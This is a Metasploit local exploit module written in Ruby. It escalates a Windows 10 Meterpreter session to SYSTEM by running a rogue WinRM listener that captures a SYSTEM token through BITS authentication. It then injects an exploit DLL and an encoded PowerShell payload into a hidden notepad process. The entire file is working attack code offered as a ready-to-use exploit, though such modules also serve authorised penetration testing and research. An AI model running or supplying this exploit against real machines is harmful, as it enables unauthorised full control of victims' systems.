##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'
require 'msf/core/exploit/powershell'
require 'msf/core/post/windows/powershell'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Exploit::Powershell
  include Post::Windows::Powershell

  def initialize(info = {})
    super(update_info(info, {
        'Name'           => 'SYSTEM token impersonation through NTLM bits authentication on missing WinRM Service.',
        'Description'    => %q(
        This module exploit BITS behavior which tries to connect to the
        local Windows Remote Management server (WinRM) every times it
        starts. The module launches a fake WinRM server which listen on
        port 5985 and triggers BITS. When BITS starts, it tries to
        authenticate to the Rogue WinRM server, which allows to steal a
        SYSTEM token. This token is then used to launch a new process
        as SYSTEM user. In the case of this exploit, powershell.exe
        is launched as SYSTEM and it downloads/executes an evil powershell
        script on a second local http server. Thus, this exploit don't
        write any file on the disk.

        WARNING:

        - As this exploit runs 2 services on the target
        (Fake WinRM on port 5985 and HTTP on port 80), a firewall popup
        may appear on target screen. Thus, this exploit is not completely
        silent.

        - A powershell windows flashes on target screen

        This exploit has been successful on :
        Windows 10 (10.0 Build 19041) 32 bits


        - Windows servers are not vulnerable because a genuine WinRM
          service is already running.

        - SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privs are
          required.

        - BITS must not be running.
      ),
        'License'        => MSF_LICENSE,
        'Author'         =>
            [
                'Cassandre', # Adapted decoder's POC for metasploit
                'decoder', # Lonely / Juicy Potato. Has written the POC
                'splinter_code',
                '0xea31',
            ],
        'Arch'           => [ARCH_X86, ARCH_X64],
        'Platform'       => 'win',
        'SessionTypes'   => ['meterpreter'],
        'DefaultOptions' =>
            {
                'EXITFUNC' => 'none',
                'WfsDelay' => '20'
            },
        'Targets'        =>
            [
                ['Automatic', {}]
            ],
        'Notes'          =>
            {
                'Stability'   => [CRASH_SAFE],
                'SideEffects' => [SCREEN_EFFECTS],
                'Reliability' => [UNRELIABLE_SESSION]
            },
        #'Payload'         =>
        #    {
        #        'Space'       => 2048,
        #        'DisableNops' => true,
        #        'BadChars'    => "\x00"
        #    },
        'References'      =>
            [
                ['URL', 'https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/'],
                ['URL', 'https://github.com/antonioCoco/RogueWinRM'],
            ],
        'DisclosureDate' => 'Dec 06 2019',
        'DefaultTarget'  => 0
    }))
    deregister_options(
        'Powershell::exec_in_place',
        'Powershell::remove_comspec',
        'Powershell::Post::timeout',
        'Powershell::Post::log_output',
        'Powershell::Post::dry_run',
        'Powershell::Post::force_wow64'
    )
  end



  def check
    os = client.sys.config.sysinfo['OS']
    build = os.match(/Build (\d+)/)
    privs = client.sys.config.getprivs
    # Fast fails
    unless (privs.include?('SeImpersonatePrivilege')) || (privs.include?('SeAssignPrimaryTokenPrivilege'))
      print_bad("Target session is missing both SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege.")
      return Exploit::CheckCode::Safe
    end
    vprint_good("Target session has either SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.")
    if os =~ /Server/
      print_bad("Windows servers are not vulnerable.")
      return Exploit::CheckCode::Safe
    end
    vprint_good("Target: (#{os})")
    if is_system?
      print_bad("Session is already elevated.")
      return Exploit::CheckCode::Safe
    end
    vprint_good("Session is not (yet) System.")
    # Windows 10 after build 17134 (April 2018 update, version 1803) is not
    # vulnerable. Due to changes in OS names, detecting the difference between
    # Server 2016/19 is most reliably done with build numbers:
    # (https://github.com/rapid7/metasploit-payloads/pull/355)
    Exploit::CheckCode::Appears
  end



  def exploit
    @payload_name = datastore['PAYLOAD']
    @payload_arch = framework.payloads.create(@payload_name).arch
    if @payload_arch.first == ARCH_X64
      dll_file_name = 'drunkpotato.x64.dll'
      psh_arch = 'x86_64'
      vprint_status("Assigning payload drunkpotato.x64.dll")
    elsif @payload_arch.first == ARCH_X86
      dll_file_name = 'drunkpotato.x86.dll'
      psh_arch = 'x86'
      vprint_status("Assigning payload drunkpotato.x86.dll")
    else
      fail_with(Failure::BadConfig, "Unknown target arch; unable to assign exploit code")
    end
    psh_opts = { :exec_in_place => true }
    evil_powershell_script = cmd_psh_payload(payload.encoded, psh_arch, psh_opts)
    vprint_status("Powershell script to be executed as system:\n\n#{evil_powershell_script}")
    library_path = ::File.join(Msf::Config.data_directory, "exploits", "drunkpotato", dll_file_name)
    library_path = ::File.expand_path(library_path)

    print_status('Launching notepad to host the exploit...')
    notepad_path = get_notepad_pathname(
        client.sys.config.sysinfo['Architecture'],
        client.sys.config.getenv('windir'),
        @payload_arch.first
    )
    notepad_process = client.sys.process.execute(notepad_path, nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Reader Sandbox won't allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_error('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, evil_powershell_script)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end

end
